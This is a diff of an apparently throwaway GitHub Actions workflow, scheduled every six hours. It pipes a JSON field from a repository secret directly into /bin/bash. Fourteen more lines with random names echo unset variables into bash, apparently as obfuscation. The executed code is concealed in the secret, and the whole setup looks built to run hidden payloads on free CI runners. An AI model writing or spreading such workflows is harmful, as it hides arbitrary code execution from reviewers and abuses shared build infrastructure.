@@ -1,23 +1,32 @@
 name: dongqingcheng4657
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 0/6 * * *'
+    - cron: '14 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: dongqingcheng4657
         env:
-          b1: ${{ secrets.b1 }}
+          t7: ${{ secrets.t7 }}
         run: |
-          echo $b1 | jq -r .gwrji481 | /bin/bash
-          echo $ioj384 | jq -r .fmjx0295 | /bin/bash
-          echo $mnico528 | jq -r .be810 | /bin/bash
-          echo $pt505 | jq -r .xuos9 | /bin/bash
-          echo $unr88916 | jq -r .r9 | /bin/bash
-          echo $tfih49295 | jq -r .u01 | /bin/bash
-          echo $mltu9 | jq -r .gh9 | /bin/bash
+          echo $t7 | jq -r .lojkc9 | /bin/bash
+          echo $mdzub02 | jq -r .a5349 | /bin/bash
+          echo $zf9409 | jq -r .pcdbi8 | /bin/bash
+          echo $kklf4 | jq -r .plqv72825 | /bin/bash
+          echo $ykbg888 | jq -r .ofcqd4519 | /bin/bash
+          echo $az53 | jq -r .awrv5161 | /bin/bash
+          echo $zla41273 | jq -r .b94516 | /bin/bash
+          echo $dx341 | jq -r .vr5 | /bin/bash
+          echo $odng73490 | jq -r .oqeei28 | /bin/bash
+          echo $p69720 | jq -r .hwlsd36562 | /bin/bash
+          echo $hyv2424 | jq -r .eshyg6061 | /bin/bash
+          echo $t21875 | jq -r .sr76 | /bin/bash
+          echo $yosm0 | jq -r .nxqu254 | /bin/bash
+          echo $skcrn10525 | jq -r .hjdn48273 | /bin/bash
+          echo $e24642 | jq -r .wh396 | /bin/bash
 
